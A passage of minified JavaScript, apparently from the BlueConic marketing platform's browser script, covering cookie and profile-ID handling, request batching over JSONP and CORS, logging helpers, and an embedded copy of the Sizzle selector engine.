          return b ? (a = $b(a)) && 0 < a.length ? a[0] : null : ((b = document.getElementById(a)) || (b = document.getElementsByTagName(a)), b && b.length && 0 < b.length ? b[0] : b instanceof HTMLCollection && 0 === b.length ? null : b);
        },
        isCSSSelector: function (a) {
          if (!a) return !1;
          var b = !1;
          -1 !== a.indexOf("[") && -1 !== a.indexOf("]") && -1 !== a.indexOf("\x3d") && (b = !0);
          var c = !1;
          if (-1 !== a.indexOf("#") || -1 !== a.indexOf(".") || -1 !== a.indexOf(" ") || -1 !== a.indexOf(":") || b) c = !0;
          return c;
        },
        normalizePosition: function (a) {
          if (!a) return null;
          c.isCSSSelector(a) || (a = "#" + a);
          return a;
        },
        addCSSToDOM: function (a, b, d) {
          if (a && 0 !== a.length) {
            l && c.logInfo("hide positions  [" + a + "]");
            for (var e = "", f = 0, g = a.length; f < g; f++) {
              var p = c.normalizePosition(a[f]);
              p && (e = e + p + " {opacity:0.0;filter:alpha(opacity\x3d0);}\n");
            }
            a = document.createElement("style");
            a.setAttribute("type", "text/css");
            a.setAttribute("id", b);
            a.styleSheet ? a.styleSheet.cssText = e : a.appendChild(document.createTextNode(e));
            (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(a);
            d && 0 < d && k.setTimeout(function () {
              var a = document.getElementById(b);
              a && (a.parentNode.removeChild(a), l && c.logInfo("timeout [" + d + "] expired; CSS [" + b + "] removed"));
            }, d);
          }
        },
        getBaseURL: function (a) {
          var b = null;
          Ga && Ga[a] && (b = Ga[a]);
          return b ? 0 == b.indexOf("/blueconic/static/plugins/") ? BC_URL + b : b : null;
        },
        parseJSON: function (a) {
          return a ? v.json.parse(a) : null;
        },
        stringifyObject: function (a, b, c) {
          return v.json.stringify(a, b, c);
        },
        checkNativeJsonLib: function () {
          Ca && (!Za || new Date().getTime() - 100) > Za && (Ca = A.isNative(k.JSON.parse, "window.JSON.parse") && A.isNative(k.JSON.stringify, "window.JSON.stringify"), Za = new Date().getTime());
          Ca || null !== xa || Nb();
        },
        handleProfileId: function (a, b) {
          m.getLevel() !== m.DO_NOT_TRACK && (c.bcSessionIdChanged(a) ? (l && c.logInfo("update cookie [BCSessionID] with profile id [" + a + "]"), c.setBcSessionId(a, b)) : qb || (c.setBcSessionId(a, b), qb = !0), a && c.getBcTempId(b) && (c.setBcTempId(null, b), q && !q.getId() && function (a) {
            this._id = a;
          }.call(q, a)));
        },
        handleTempProfileId: function (a, b) {
          a && c.getBcTempId(b) !== a && c.setBcTempId(a, b && c.getBcTempId() ? b : null, 6E5);
        },
        log: function (a) {
          T && console.log("[BC]" + a);
        },
        logError: function (a) {
          for (; -1 !== a.indexOf("\x3cbr\x3e");) a = a.replace("\x3cbr\x3e", "\n            ");
          c.log("[ERROR] " + a);
          T && console.trace && (c.log("[ERROR] --stacktrace--"), console.trace(), c.log("[ERROR] --end stacktrace--"));
        },
        logWarning: function (a) {
          l && c.log("[WARNING] " + a);
        },
        logInfo: function (a) {
          if (l) {
            for (var b = new Date().getTime() - Qb; -1 !== a.indexOf("\x3cbr\x3e");) a = a.replace("\x3cbr\x3e", "\n           ");
            c.log("[INFO] " + a + " +" + b + " ms");
          }
        },
        logDeprecated: function (a, b) {
          l && c.log("[DEPRECATED] function [" + a + "] is deprecated. \n                 Please use : " + b);
        },
        formatLocalDate: function () {
          var a = new Date(),
            b = -a.getTimezoneOffset(),
            c = 0 <= b ? "+" : "-",
            e = function (a) {
              a = Math.abs(Math.floor(a));
              return (10 > a ? "0" : "") + a;
            };
          return a.getFullYear() + "-" + e(a.getMonth() + 1) + "-" + e(a.getDate()) + "T" + e(a.getHours()) + ":" + e(a.getMinutes()) + ":" + e(a.getSeconds()) + c + e(b / 60) + ":" + e(b % 60);
        },
        getCurrentTime: function () {
          var a = new Date();
          return ("0" + a.getHours()).slice(-2) + ":" + ("0" + a.getMinutes()).slice(-2);
        },
        objectToUrl: function (a) {
          var b = "",
            d;
          for (d in a) {
            var e = a[d];
            if (c.isArray(e)) for (var f = 0; f < e.length; f++) "" !== b && (b += "\x26"), b += d + "\x3d" + encodeURIComponent(e[f]);else "" !== b && (b += "\x26"), b += d + "\x3d" + encodeURIComponent(e);
          }
          return b;
        },
        getZoneId: function () {
          return S ? sessionStorage.getItem("BCZoneID") : c.getCookie("BCZoneID");
        },
        handleZoneId: function (a) {
          S ? a ? sessionStorage.setItem("BCZoneID", a) : sessionStorage.removeItem("BCZoneID") : a ? c.setCookie("BCZoneID", a, 3E5) : c.setCookie("BCZoneID", null);
        }
      };
      A.hideAllPositions();
      var Sa;
      Sa = J ? u.prototype.fn.getDomainGroup(J) : u.prototype.fn.getDomainGroup(document.location.hostname);
      var Db = Math.floor(1E3 * Math.random()) + 100,
        g = {
          GET_PROFILE: "getProfile",
          CREATE_PROFILE: "createProfile",
          DELETE_PROFILE: "deleteProfile",
          SET_PROPERTIES: "setProperties",
          ADD_PROPERTIES: "addProperties",
          INCREMENT_PROPERTIES: "incrementProperties",
          GET_PROPERTIES: "getProperties",
          GET_LOGIN_STATUS: "getLoginStatus",
          GET_ALL: "getAll",
          CREATE_EVENT: "createEvent",
          GET_PROPERTY_LABELS: "getPropertyLabels",
          GET_PROFILE_PROPERTIES: "getProfileProperties",
          SEND_MAIL: "sendMail",
          ADD_OPTIN: "addOptin",
          REMOVE_OPTIN: "removeOptin",
          ADD_OPTOUT: "addOptout",
          REMOVE_OPTOUT: "removeOptout",
          SET_PERMISSION_LEVEL: "setPermissionLevel",
          SET_OBJECTIVES: "setObjectives",
          ADD_OBJECTIVES: "addObjectives",
          CREATE_TIMELINE_EVENT: "createTimelineEvent",
          resourceURL_GET: (I ? BC_URL : Q()) + "/DG/" + Sa + "/rest/rpc/",
          resourceURL_POST: (I ? BC_URL : Q()) + "/DG/" + Sa + "/rest/rpc/" + ++Db,
          resourceURL_CST: BC_URL + "/DG/" + Sa + "/cs",
          batchRequests: [],
          usedRequestIds: [],
          requestId: 0,
          openRequests: 0,
          lastSyncedCookieId: E,
          thirdPartyCookieId: null,
          cookieSyncTimeoutHandle: !1,
          _csRequestDone: U && null !== qa() ? !1 : !0,
          _rpcThrottlingRequestCount: 0,
          _rpcThrottlingTimeoutHandle: null,
          _batchTimeoutHandlers: {},
          getNextRequestId: function () {
            var a = new Date().getTime() + ++g.requestId;
            if (-1 === c.indexOfArray(g.usedRequestIds, a)) g.usedRequestIds.push(a);else return this.getNextRequestId();
            return a;
          },
          JSONP: function () {
            function a(a, b, d) {
              var f = document.createElement("script"),
                g = !1;
              f.src = a;
              f.async = !0;
              f.onload = f.onreadystatechange = function () {
                g || this.readyState && "loaded" !== this.readyState && "complete" !== this.readyState || (g = !0, f.onload = f.onreadystatechange = null, f && f.parentNode && f.parentNode.removeChild(f));
              };
              f.onerror = function (a) {
                d && c.handleZoneId();
                b && b(a);
              };
              e || (e = document.getElementsByTagName("head")[0]);
              e.appendChild(f);
            }
            function b(a, b) {
              a = "";
              !U && b && (b = null);
              var d = c.getCookies();
              b = b || c.getBcSessionId(d) || "";
              var d = c.getBcTempId(d) || "",
                e = J ? encodeURIComponent(J) : "";
              a += "referer\x3d" + encodeURIComponent(f.location) + "\x26";
              if (f.name && -1 < f.name.indexOf("bc_")) {
                var g = f.name;
                if (g) {
                  for (var h = !1, l = g, r = 0; r < wb.length; r++) {
                    var k = wb[r];
                    -1 < g.indexOf(k) && (l = k, h = !0);
                  }
                  g = h ? l : g.substring(g.indexOf("bc_"));
                  a += "mode\x3d" + g + "\x26";
                }
              } else if (I || f.opener) a += "checkCookie\x3dtrue\x26isopener\x3d" + ("undefined" != typeof f.opener && null != f.opener) + "\x26";
              a += "bcsessionid\x3d" + b + "\x26bctempid\x3d" + d + "\x26overruleReferrer\x3d" + e + "\x26time\x3d" + encodeURIComponent(c.formatLocalDate());
              if (q) for (b = q.getDntRefusedObjectives(), d = 0; d < b.length; d++) a += "\x26bcro\x3d" + encodeURIComponent(b[d]);
              return a;
            }
            function d(a, e, f, g, h, l) {
              l = (-1 === a.indexOf("?") ? "?" : "") + b(a, l);
              var n = function (a, b) {
                var c = new XMLHttpRequest();
                "withCredentials" in c ? (c.open(a, b, !0), c.setRequestHeader("Content-Type", "text/plain"), c.withCredentials = !0, c.timeout = 3E4) : c = null;
                return c;
              }("POST", a + l + "\x26ts\x3d" + new Date().getTime());
              if (!n) return c.logWarning("CORS POST request failed, is XMLHttpRequest overruled? Fallback to GET."), g(), !1;
              n.onload = function () {
                if (n.responseText) {
                  var a = v.json.parse(n.responseText);
                  !h && a.location ? d(a.location, e, f, g, !0) : f(a);
                }
              };
              n.onerror = function () {
                0 < n.status ? (c.logWarning("CORS POST request failed."), usePostMethod() && c.handleZoneId()) : c.log("[WARNING] BlueConic request failed, please make sure '" + (J ? J : document.location.hostname) + "' is added as a channel (or alias) in BlueConic.");
                g && g();
              };
              n.onabort = function (a) {
                T && console.log("CORS request is aborted.", a);
              };
              n.ontimeout = function (a) {
                T && console.log("CORS request has timed-out, 30s exceeded.");
              };
              n.send(e);
              return !0;
            }
            var e,
              f = this,
              g = {};
            return {
              get: function (c, d, e, h, l, k, m, q) {
                var n = -1 === (c || "").indexOf("?") ? "?" : "\x26";
                d = d || {};
                for (var r in d) ea.call(d, r) && (n += r + "\x3d" + d[r] + "\x26");
                m && (n += b(c, q));
                var p = "bc_json" + ++Db;
                f[p] = function (a) {
                  e(a);
                  try {
                    delete f[p];
                  } catch (ac) {}
                  f[p] = null;
                };
                a(c + n + "\x26" + (h || g.callbackName || "callback") + "\x3d" + p, l, k);
                return p;
              },
              post: d,
              init: function (a) {
                g = a;
              }
            };
          }(),
          resetThrottlingCounter: function (a) {
            g._rpcThrottlingRequestCount = 0;
            a && g._rpcThrottlingTimeoutHandle && (clearInterval(g._rpcThrottlingTimeoutHandle), g._rpcThrottlingTimeoutHandle = null);
          },
          handleRevisions: function () {
            var a = null,
              b;
            if (S) {
              b = [];
              for (var d = 0; d < localStorage.length; d++) b.push(localStorage.key(d));
            } else a = c.getCookies(), b = c.getPropertiesFromObject(a);
            for (var d = 0, e = b.length; d < e; d++) {
              var f = b[d];
              if (f && -1 !== f.indexOf("BCRevision")) {
                var h;
                S ? h = localStorage.getItem(f) : a && (h = a[f]);
                var k = c.parseJSON(h);
                if (k) {
                  var r = k.method,
                    n = k.param,
                    k = k.requestId;
                  r && n && k && (g.usedRequestIds.push(k), l && c.logInfo("scheduled revision RPC for requestId [" + k + "] with method : [" + r + "]"), n.source = {
                    revision: ["backlog"]
                  }, g.addBatchRequest(r, n, k, null, null), S && localStorage.getItem(f) ? localStorage.removeItem(f) : c.setCookie(f, null));
                }
              }
            }
          },
          RPCTask: function (a, b, d, e, f) {
            this._id = a + "";
            this._param = b;
            this._method = d;
            this._caller = e;
            this._callBack = f;
            this._isFinished = this._isQueued = !1;
            this._revCookie = this._rpc = null;
            this.getContentLength = function () {
              return encodeURIComponent(c.stringifyObject(this.getRPC())).length;
            };
            this.getId = function () {
              return this._id.replace("rev_", "");
            };
            this.isQueued = function () {
              return this._isQueued;
            };
            this.getMethod = function () {
              return this._method;
            };
            this.queued = function () {
              this._isQueued = !0;
            };
            this.isFinished = function () {
              return this._isFinished;
            };
            this.setParameter = function (a) {
              this._param = a;
              this._rpc = null;
            };
            this.getParameter = function () {
              return this._param;
            };
            this.finished = function (a) {
              this._isFinished = !0;
              c.handleZoneId(a.zoneId);
              this.removeRevisionCookie();
              c.doCallback(this._caller, this._callBack, a);
            };
            this.getRPC = function () {
              this._rpc || (this._rpc = {
                method: encodeURIComponent(this._method),
                params: c.stringifyObject(this._param),
                id: encodeURIComponent(this.getId())
              });
              return this._rpc;
            };
            this.setRevisionCookie = function () {
              if (!(0 === this._id.indexOf("rev") || m.getLevel() === m.DO_NOT_TRACK || this.getContentLength() > Da || this._method !== g.SET_PROPERTIES && this._method !== g.ADD_PROPERTIES && this._method !== g.SEND_MAIL && this._method !== g.CREATE_EVENT && this._method !== g.CREATE_TIMELINE_EVENT || this._method === g.CREATE_EVENT && this._param && this._param.type && "PAGEVIEW" === this._param.type[0])) {
                var a = "rev_" + this._id,
                  b = c.stringifyObject({
                    method: this._method,
                    param: this._param,
                    requestId: a
                  }),
                  d = "BCRevision_" + this._id,
                  e = function () {
                    c.setCookie(d, b, 0);
                    var e = c.getCookie(d);
                    if (!e) {
                      for (var e = c.getCookies(), e = c.getPropertiesFromObject(e), f = 0, g = e.length; f < g; f++) {
                        var h = e[f];
                        0 === h.indexOf("BCRevision") && c.setCookie(h, null);
                      }
                      c.setCookie(d, b, 0);
                      e = c.getCookie(d);
                      if (!e) {
                        l && c.logInfo("could not store revision cookie [" + d + "]");
                        return;
                      }
                    }
                    l && c.logInfo("revision cookie with name [" + d + "] with revision [" + a + "] stored");
                  };
                if (S) {
                  try {
                    localStorage.setItem(d, b);
                  } catch (z) {
                    l && c.logInfo("adding item [" + d + "] to localStorage failed, fallback to cookie.");
                  }
                  localStorage.getItem(d) ? l && c.logInfo("revision with name [" + d + "] with revision [" + a + "] is stored in localStorage.") : e();
                } else e();
                this._revCookie = d;
              }
            };
            this.removeRevisionCookie = function () {
              this._revCookie && (S && localStorage.getItem(this._revCookie) ? (l && c.logInfo("revision with name [" + this._revCookie + "] removed from localStorage"), localStorage.removeItem(this._revCookie)) : (l && c.logInfo("revision cookie with name [" + this._revCookie + "] removed"), c.setCookie(this._revCookie, null)));
            };
          },
          RemoteRequest: function (a, b, d, e, f) {
            this._caller = b;
            this._onSuccess = d;
            this._isFinished = !1;
            this._parameter = e;
            this._requestId = f;
            this._method = a;
            this._tasks = [];
            this.getTasks = function () {
              return this._tasks;
            };
            this.isFinished = function () {
              return this._isFinished;
            };
            this.toString = function () {
              for (var a = new g.RPCTask(this._requestId, this._parameter, this._method, null, null).getContentLength(), a = "RemoteRequest [" + this._requestId + "] - method : [" + this._method + "], Tasks : [" + this._tasks.length + "], contentLength : [" + a + "]", b = 0, d = this._tasks.length; b < d; b++) {
                var e = this._tasks[b],
                  f = e.getContentLength(),
                  a = a + ("\x3cbr\x3eTask [" + e.getId() + "] - Content length : [" + f + "]. Is finished [" + e.isFinished() + "]."),
                  e = e.getParameter();
                if (!e) break;
                var e = e.properties ? e.properties : e,
                  h;
                for (h in e) if (ea.call(e, h)) if (a += "\x3cbr\x3e  -" + h, (f = e[h]) && 0 !== f.length) {
                  if (c.isArray(f)) for (var l = 0, k = f.length; l < k; l++) {
                    var m = f[l];
                    if ("" === m) m = "(empty string)";else if (null == m || m == E) m = "(null or undefined)";
                    a += "\x3cbr\x3e    " + m;
                  } else f && (a += "\x3cbr\x3e    " + f);
                } else a += "\x3cbr\x3e    (null or undefined)";
              }
              return a;
            };
            b = function (a) {
              for (var b = this._tasks, d = 0, e = b.length; d < e; d++) if (!b[d].isFinished()) return;
              this._isFinished = !0;
              l && c.logInfo(this.toString());
              c.doCallback(this._caller, this._onSuccess, a);
            };
            d = new g.RPCTask(this._requestId, this._parameter, this._method, this, b);
            if (d.getContentLength() <= Da) y.call(this._tasks, d);else switch (a) {
              case g.ADD_PROPERTIES:
              case g.SET_PROPERTIES:
                d = function (a, b, d) {
                  for (var e = [], f = function (a, b) {
                      this.properties[a] = c.ensureArray(b);
                    }, h = function (a) {
                      try {
                        delete this.properties[a];
                      } catch (F) {}
                    }, l = function () {
                      return 1 === c.getPropertiesFromObject(this.properties).length || new g.RPCTask(a, this, b, null, null).getContentLength() <= Da ? !0 : !1;
                    }, n = c.getPropertiesFromObject(d.properties), k = {
                      properties: {}
                    }, m = 0, r = n.length; m < r; m++) {
                    var p = n[m],
                      q = d.properties[p];
                    f.call(k, p, q);
                    l.call(k) || (h.call(k, p), y.call(e, k), k = {
                      properties: {}
                    }, f.call(k, p, q));
                  }
                  y.call(e, k);
                  return e;
                }(this._requestId, this._method, this._parameter);
                e = 0;
                for (var h = d.length; e < h; e++) {
                  var k = new g.RPCTask(f + "-" + e, d[e], a, this, b);
                  y.call(this._tasks, k);
                }
                break;
              default:
                y.call(this._tasks, d);
            }
          },
          addBatchRequest: function (a, b, c, e, f) {
            a = new g.RemoteRequest(a, e, f, b, c);
            y.call(g.batchRequests, a);
          },
          submitBatchTimeout: function (a, b) {
            g._batchTimeoutHandlers[b] && clearTimeout(g._batchTimeoutHandlers[b]);
            g._batchTimeoutHandlers[b] = setTimeout(function () {
              delete g._batchTimeoutHandlers[b];
              g.batchRequests && 0 !== g.batchRequests.length && g.submitBatch();
            }, a);
          },
          submitBatch: function () {
            var a = function () {
                var a = Tb;
                if (a) switch (Pb) {
                  case "FORCE_GET":
                    a = !1;
                    break;
                  case "POST_NATIVE_ONLY":
                    a = XMLHttpRequest.prototype && A.isNative(XMLHttpRequest.prototype.send, "XMLHttpRequest.prototype.send");
                }
                return a;
              }(),
              b = function (a) {
                for (var d = [], e = 0, g = 0, h = a.length; g < h; g++) for (var k = a[g].getTasks(), m = 0, r = k.length; m < r; m++) {
                  var p = k[m];
                  if (!p.isQueued()) {
                    var q = parseInt(p.getContentLength());
                    if (e + q <= Da) p.queued(), e += q, y.call(d, p);else {
                      0 === d.length && (p.queued(), e += q, y.call(d, p), l && c.logInfo("RPC task with id [" + p.getId() + "] method [" + p.getMethod() + " ] contains a profile property value which could be too large too handle.\x3cbr\x3e The size of the RPC is [" + q + "] while the max size is [" + Da + "]"));
                      f.call(this, d, function () {
                        b.call(this, a);
                      });
                      return;
                    }
                  }
                }
                0 < d.length && f.call(this, d, null);
              },
              d = function (a, b, d) {
                if (a) {
                  a = c.ensureArray(a);
                  for (var e = c.getCookies(), f = 0; f < a.length; f++) {
                    var h = a[f];
                    if (h) {
                      e.BCTempID && h.profileId && (Va = !0);
                      h.secondAndTopLevelDomain && ($a = h.secondAndTopLevelDomain);
                      c.handleTempProfileId(h.tempId, e);
                      c.handleProfileId(h.profileId, e);
                      for (var l = 0; l < b.length; l++) {
                        var k = b[l];
                        k.getId() === h.id && (k.finished(h), c.removeItemFromArray(g.usedRequestIds, h.id));
                      }
                    }
                  }
                } else for (a = 0; a < b.length; a++) b[a].finished();
                d && "function" === typeof d && d.call(this);
                g.openRequests--;
              },
              e = function (a) {
                if (!c.getZoneId()) return a;
                a && "/" !== a[a.length - 1] && (a += "/");
                return a += c.getZoneId();
              },
              f = function (b, f) {
                if (20 <= g.openRequests) c.logWarning("Too many open RPC requests (20), task will not be processed");else if (100 <= g._rpcThrottlingRequestCount) c.logWarning("Too many RPC requests (100) done in this timeframe (1 minute), task will not be processed.");else {
                  null === g._rpcThrottlingTimeoutHandle && (g._rpcThrottlingTimeoutHandle = setInterval(function () {
                    g.resetThrottlingCounter(!1);
                  }, 6E4));
                  g._rpcThrottlingRequestCount++;
                  var h = function (a, h, k) {
                    var l = {
                      requests: encodeURIComponent(c.stringifyObject(a))
                    };
                    l.requests && "null" !== l.requests && (g.openRequests++, g.JSONP.get(e(g.resourceURL_GET), l, function (a) {
                      d(a, b, f);
                    }, null, function () {
                      g.JSONP.get(e(g.resourceURL_GET), l, function (a) {
                        d(a, b, f);
                      }, null, function () {
                        g.openRequests--;
                      }, h, !0, k);
                    }, h, !0, k));
                  };
                  if (q && q.getId() && !c.getBcSessionId() && !c.getBcTempId()) {
                    q = new Ja();
                    t.clearQueue();
                    for (var k = [], n = 0; n < b.length; n++) {
                      var m = b[n];
                      -1 < [g.ADD_PROPERTIES, g.SET_PROPERTIES].indexOf(m.getMethod()) && (m.finished({}), k.push(m));
                    }
                    for (n = 0; n < k.length; n++) c.removeItemFromArray(b, k[n]);
                    if (0 === b.length) {
                      f && "function" === typeof f && f.call(this);
                      return;
                    }
                  }
                  for (var p = [], k = 0; k < b.length; k++) y.call(p, b[k].getRPC()), b[k].setRevisionCookie();
                  var r = function (k) {
                    a ? (g.openRequests++, g.JSONP.post(e(g.resourceURL_POST), c.stringifyObject(p), function (a) {
                      d(a, b, f);
                    }, function () {
                      g.openRequests--;
                      c.logWarning("CORS POST request failed, fallback on JSONP GET request.");
                      h(p, !1, k);
                    }, !1, k)) : h(p, !0, k);
                  };
                  g._csRequestDone ? r() : g.JSONP.get(g.resourceURL_CST, {}, function (a) {
                    var b = null;
                    a && a[0] && a[0].profileId && (b = a[0].profileId, l && c.logInfo("CS callback success; third-party cookie:" + b));
                    g.thirdPartyCookieId = b;
                    g._csRequestDone = !0;
                    r(b);
                  }, null, function () {
                    g._csRequestDone = !0;
                    r();
                  }, !1, !1);
                }
              },
              h = function (a) {
                for (var b = [], c = 0, d = a.length; c < d; c++) for (var e = a[c].getTasks(), f = 0, g = e.length; f < g; f++) e[f].isQueued() || (e[f].queued(), y.call(b, e[f]));
                return b;
              },
              k = g.batchRequests;
            a ? (h = h.call(this, k), 0 < h.length && f.call(this, h)) : b.call(this, k);
            g.batchRequests = [];
          }
        };
      (function () {
        if ("undefined" !== typeof bcSubscriptions && c.isArray(bcSubscriptions)) {
          for (var a = 0, b = bcSubscriptions.length; a < b; a++) {
            var d = bcSubscriptions[a];
            if (!c.isArray(d) || 2 !== d.length) return;
            w.subscribe(d[0], null, d[1]);
          }
          bcSubscriptions = {
            push: function (a) {
              c.isArray(a) && 2 === a.length && w.subscribe(a[0], null, a[1]);
            }
          };
        }
      })();
      (function () {
        if ("complete" === document.readyState || "interactive" === document.readyState) c.docReady();else if (document.addEventListener) document.addEventListener("readystatechange", function () {
          c.docReady();
        }, !1), document.addEventListener("DOMContentLoaded", function () {
          c.docReady();
        }, !1), k.addEventListener("load", function () {
          c.docReady();
        }, !1);else if (document.attachEvent) {
          document.attachEvent("onreadystatechange", function () {
            c.docReady();
          });
          k.attachEvent("onload", function () {
            c.docReady();
          });
          var a = !1;
          try {
            a = null == k.frameElement;
          } catch (b) {}
          document.documentElement.doScroll && a && c.docReady();
        }
      })();
      k.Sizzle && (k.bcTempSizzle = k.Sizzle);
      (function (a) {
        function b(a, b, c, d) {
          var e,
            f,
            x,
            g,
            G,
            h = b && b.ownerDocument,
            B = b ? b.nodeType : 9;
          c = c || [];
          if ("string" !== typeof a || !a || 1 !== B && 9 !== B && 11 !== B) return c;
          if (!d && ((b ? b.ownerDocument || b : Z) !== D && L(b), b = b || D, aa)) {
            if (11 !== B && (g = Ja.exec(a))) if (e = g[1]) {
              if (9 === B) {
                if (f = b.getElementById(e)) {
                  if (f.id === e) return c.push(f), c;
                } else return c;
              } else {
                if (h && (f = h.getElementById(e)) && T(b, f) && f.id === e) return c.push(f), c;
              }
            } else {
              if (g[2]) return ta.apply(c, b.getElementsByTagName(a)), c;
              if ((e = g[3]) && F.getElementsByClassName && b.getElementsByClassName) return ta.apply(c, b.getElementsByClassName(e)), c;
            }
            if (!(!F.qsa || da[a + " "] || M && M.test(a))) {
              if (1 !== B) h = b, G = a;else if ("object" !== b.nodeName.toLowerCase()) {
                (x = b.getAttribute("id")) ? x = x.replace(za, Aa) : b.setAttribute("id", x = H);
                f = R(a);
                for (e = f.length; e--;) f[e] = "#" + x + " " + v(f[e]);
                G = f.join(",");
                h = ra.test(a) && t(b.parentNode) || b;
              }
              if (G) try {
                return ta.apply(c, h.querySelectorAll(G)), c;
              } catch (bc) {
                da(a);
              } finally {
                x === H && b.removeAttribute("id");
              }
            }
          }
          return Y(a.replace(ea, "$1"), b, c, d);
        }
        function c() {
          function a(c, d) {
            b.push(c + " ") > C.cacheLength && delete a[b.shift()];
            return a[c + " "] = d;
          }
          var b = [];
          return a;
        }
        function e(a) {
          a[H] = !0;
          return a;
        }
        function f(a) {
          var b = D.createElement("fieldset");
          try {
            return !!a(b);
          } catch (G) {
            return !1;
          } finally {
            b.parentNode && b.parentNode.removeChild(b);
          }
        }
        function g(a, b) {
          a = a.split("|");
          for (var c = a.length; c--;) C.attrHandle[a[c]] = b;
        }
        function k(a, b) {
          var c = b && a,
            d = c && 1 === a.nodeType && 1 === b.nodeType && a.sourceIndex - b.sourceIndex;
          if (d) return d;
          if (c) for (; c = c.nextSibling;) if (c === b) return -1;
          return a ? 1 : -1;
        }
        function l(a) {
          return function (b) {
            return "input" === b.nodeName.toLowerCase() && b.type === a;
          };
        }
        function n(a) {
          return function (b) {
            var c = b.nodeName.toLowerCase();
            return ("input" === c || "button" === c) && b.type === a;
          };
        }
        function m(a) {
          return function (b) {
            return "form" in b ? b.parentNode && !1 === b.disabled ? "label" in b ? "label" in b.parentNode ? b.parentNode.disabled === a : b.disabled === a : b.isDisabled === a || b.isDisabled !== !a && Ka(b) === a : b.disabled === a : "label" in b ? b.disabled === a : !1;
          };
        }
        function q(a) {
          return e(function (b) {
            b = +b;
            return e(function (c, d) {
              for (var e, f = a([], c.length, b), x = f.length; x--;) c[e = f[x]] && (c[e] = !(d[e] = c[e]));
            });
          });
        }
        function t(a) {
          return a && "undefined" !== typeof a.getElementsByTagName && a;
        }
        function u() {}
        function v(a) {
          for (var b = 0, c = a.length, d = ""; b < c; b++) d += a[b].value;
          return d;
        }
        function w(a, b, c) {
          var d = b.dir,
            e = b.next,
            f = e || d,
            x = c && "parentNode" === f,
            g = ha++;
          return b.first ? function (b, c, e) {
            for (; b = b[d];) if (1 === b.nodeType || x) return a(b, c, e);
            return !1;
          } : function (b, c, h) {
            var G,
              B,
              k = [na, g];
            if (h) for (; b = b[d];) {
              if ((1 === b.nodeType || x) && a(b, c, h)) return !0;
            } else for (; b = b[d];) if (1 === b.nodeType || x) if (B = b[H] || (b[H] = {}), B = B[b.uniqueID] || (B[b.uniqueID] = {}), e && e === b.nodeName.toLowerCase()) b = b[d] || b;else {
              if ((G = B[f]) && G[0] === na && G[1] === g) return k[2] = G[2];
              B[f] = k;
              if (k[2] = a(b, c, h)) return !0;
            }
            return !1;
          };
        }
        function y(a) {
          return 1 < a.length ? function (b, c, d) {
            for (var e = a.length; e--;) if (!a[e](b, c, d)) return !1;
            return !0;
          } : a[0];
        }
        function A(a, b, c, d, e) {
          for (var f, x = [], g = 0, h = a.length, G = null != b; g < h; g++) if (f = a[g]) if (!c || c(f, d, e)) x.push(f), G && b.push(g);
          return x;
        }
        function I(a, c, d, f, g, h) {
          f && !f[H] && (f = I(f));
          g && !g[H] && (g = I(g, h));
          return e(function (e, x, h, G) {
            var B,
              k,
              l = [],
              ma = [],
              n = x.length,
              m;
            if (!(m = e)) {
              m = c || "*";
              for (var p = h.nodeType ? [h] : h, q = [], r = 0, Ta = p.length; r < Ta; r++) b(m, p[r], q);
              m = q;
            }
            m = !a || !e && c ? m : A(m, l, a, h, G);
            p = d ? g || (e ? a : n || f) ? [] : x : m;
            d && d(m, p, h, G);
            if (f) for (B = A(p, ma), f(B, [], h, G), h = B.length; h--;) if (k = B[h]) p[ma[h]] = !(m[ma[h]] = k);
            if (e) {
              if (g || a) {
                if (g) {
                  B = [];
                  for (h = p.length; h--;) (k = p[h]) && B.push(m[h] = k);
                  g(null, p = [], B, G);
                }
                for (h = p.length; h--;) (k = p[h]) && -1 < (B = g ? Ha(e, k) : l[h]) && (e[B] = !(x[B] = k));
              }
            } else p = A(p === x ? p.splice(n, p.length) : p), g ? g(null, x, p, G) : ta.apply(x, p);
          });
        }
        function O(a) {
          var b,
            c,
            d,
            e = a.length,
            f = C.relative[a[0].type];
          c = f || C.relative[" "];
          for (var g = f ? 1 : 0, x = w(function (a) {
              return a === b;
            }, c, !0), h = w(function (a) {
              return -1 < Ha(b, a);
            }, c, !0), k = [function (a, c, d) {
              a = !f && (d || c !== U) || ((b = c).nodeType ? x(a, c, d) : h(a, c, d));
              b = null;
              return a;
            }]; g < e; g++) if (c = C.relative[a[g].type]) k = [w(y(k), c)];else {
            c = C.filter[a[g].type].apply(null, a[g].matches);
            if (c[H]) {
              for (d = ++g; d < e && !C.relative[a[d].type]; d++);
              return I(1 < g && y(k), 1 < g && v(a.slice(0, g - 1).concat({
                value: " " === a[g - 2].type ? "*" : ""
              })).replace(ea, "$1"), c, g < d && O(a.slice(g, d)), d < e && O(a = a.slice(d)), d < e && v(a));
            }
            k.push(c);
          }
          return y(k);
        }
        function S(a, c) {
          var d = 0 < c.length,
            f = 0 < a.length,
            g = function (e, g, h, x, G) {
              var k,
                B,
                l,
                m = 0,
                n = "0",
                ma = e && [],
                p = [],
                q = U,
                r = e || f && C.find.TAG("*", G),
                Ta = na += null == q ? 1 : Math.random() || .1,
                t = r.length;
              for (G && (U = g === D || g || G); n !== t && null != (k = r[n]); n++) {
                if (f && k) {
                  B = 0;
                  g || k.ownerDocument === D || (L(k), h = !aa);
                  for (; l = a[B++];) if (l(k, g || D, h)) {
                    x.push(k);
                    break;
                  }
                  G && (na = Ta);
                }
                d && ((k = !l && k) && m--, e && ma.push(k));
              }
              m += n;
              if (d && n !== m) {
                for (B = 0; l = c[B++];) l(ma, p, g, h);
                if (e) {
                  if (0 < m) for (; n--;) ma[n] || p[n] || (p[n] = ua.call(x));
                  p = A(p);
                }
                ta.apply(x, p);
                G && !e && 0 < p.length && 1 < m + c.length && b.uniqueSort(x);
              }
              G && (na = Ta, U = q);
              return ma;
            };
          return d ? e(g) : g;
        }
        var J,
          F,
          C,
          Q,
          X,
          R,
          V,
          Y,
          U,
          K,
          P,
          L,
          D,
          ba,
          aa,
          M,
          N,
          W,
          T,
          H = "sizzle" + 1 * new Date(),
          Z = a.document,
          na = 0,
          ha = 0,
          ga = c(),
          ja = c(),
          ka = c(),
          da = c(),
          la = function (a, b) {
            a === b && (P = !0);
            return 0;
          },
          sa = {}.hasOwnProperty,
          Ia = [],
          ua = Ia.pop,
          va = Ia.push,
          ta = Ia.push,
          qa = Ia.slice,
          Ha = function (a, b) {
            for (var c = 0, d = a.length; c < d; c++) if (a[c] === b) return c;
            return -1;
          },
          wa = /[\x20\t\r\n\f]+/g,
